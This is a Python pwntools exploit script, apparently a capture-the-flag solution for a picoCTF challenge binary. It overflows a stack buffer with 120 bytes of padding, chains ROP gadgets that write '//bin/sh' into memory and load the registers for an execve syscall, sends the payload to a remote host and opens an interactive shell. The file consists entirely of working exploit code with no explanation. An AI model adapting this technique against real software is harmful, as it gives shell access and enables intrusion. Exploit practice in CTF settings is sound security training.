#!/usr/bin/env python2
from pwn import *
from struct import pack

elf = ELF("./vuln")

LOCAL = False
HOST = "jupiter.challenges.picoctf.org"
PORT = 26735

p = lambda x : pack('Q', x)

IMAGE_BASE_0 = 0x0000000000400000 # f01c7ecf217d3cebdf4f676920f17ebfcb33d5d14d78df8dfffed5c5290e6f62
rebase_0 = lambda x : p(x + IMAGE_BASE_0)

payload = 'A'*120

payload += rebase_0(0x000000000000dbeb) # 0x000000000040dbeb: pop r13; ret; 
payload += '//bin/sh'
payload += rebase_0(0x0000000000000696) # 0x0000000000400696: pop rdi; ret; 
payload += rebase_0(0x00000000002ba0e0)
payload += rebase_0(0x00000000000695c9) # 0x00000000004695c9: mov qword ptr [rdi], r13; pop rbx; pop rbp; pop r12; pop r13; ret; 
payload += p(0xdeadbeefdeadbeef)
payload += p(0xdeadbeefdeadbeef)
payload += p(0xdeadbeefdeadbeef)
payload += p(0xdeadbeefdeadbeef)
payload += rebase_0(0x000000000000dbeb) # 0x000000000040dbeb: pop r13; ret; 
payload += p(0x0000000000000000)
payload += rebase_0(0x0000000000000696) # 0x0000000000400696: pop rdi; ret; 
payload += rebase_0(0x00000000002ba0e8)
payload += rebase_0(0x00000000000695c9) # 0x00000000004695c9: mov qword ptr [rdi], r13; pop rbx; pop rbp; pop r12; pop r13; ret; 
payload += p(0xdeadbeefdeadbeef)
payload += p(0xdeadbeefdeadbeef)
payload += p(0xdeadbeefdeadbeef)
payload += p(0xdeadbeefdeadbeef)
payload += rebase_0(0x0000000000000696) # 0x0000000000400696: pop rdi; ret; 
payload += rebase_0(0x00000000002ba0e0)
payload += rebase_0(0x0000000000010ca3) # 0x0000000000410ca3: pop rsi; ret; 
payload += rebase_0(0x00000000002ba0e8)
payload += rebase_0(0x000000000004cc26) # 0x000000000044cc26: pop rdx; ret; 
payload += rebase_0(0x00000000002ba0e8)
payload += rebase_0(0x00000000000163f4) # 0x00000000004163f4: pop rax; ret; 
payload += p(0x000000000000003b)
payload += rebase_0(0x0000000000049e35) # 0x0000000000449e35: syscall; ret;


if LOCAL :
	conn = elf.process()
else :
	conn = remote(HOST,PORT)
	
conn.sendline("84")
conn.sendline(payload)
conn.interactive()
conn.close()
